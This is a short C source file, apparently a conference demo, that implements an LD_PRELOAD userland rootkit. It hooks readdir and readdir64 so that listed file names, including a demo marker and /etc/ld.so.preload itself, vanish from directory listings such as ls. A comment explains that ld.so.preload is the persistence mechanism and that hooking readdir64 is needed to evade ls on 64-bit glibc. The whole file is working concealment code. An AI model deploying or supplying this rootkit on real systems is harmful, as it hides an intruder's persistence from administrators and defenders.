#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

// Add entries here to hide additional filenames. NULL terminates the list.
static const char *hidden[] = {
    "bsides_marker",    // the demo marker file in /opt/bsides/
    "ld.so.preload",    // the persistence mechanism hides itself from ls /etc/
    NULL
};

static int should_hide(const char *name) {
    for (int i = 0; hidden[i]; i++)
        if (strcmp(name, hidden[i]) == 0) return 1;
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = orig(dirp)) != NULL) {
        if (!should_hide(e->d_name)) break;
    }
    return e;
}

struct dirent64 *readdir64(DIR *dirp) {   // <-- ls uses THIS on 64-bit glibc; hooking only readdir fails
    static struct dirent64 *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = orig(dirp)) != NULL) {
        if (!should_hide(e->d_name)) break;
    }
    return e;
}
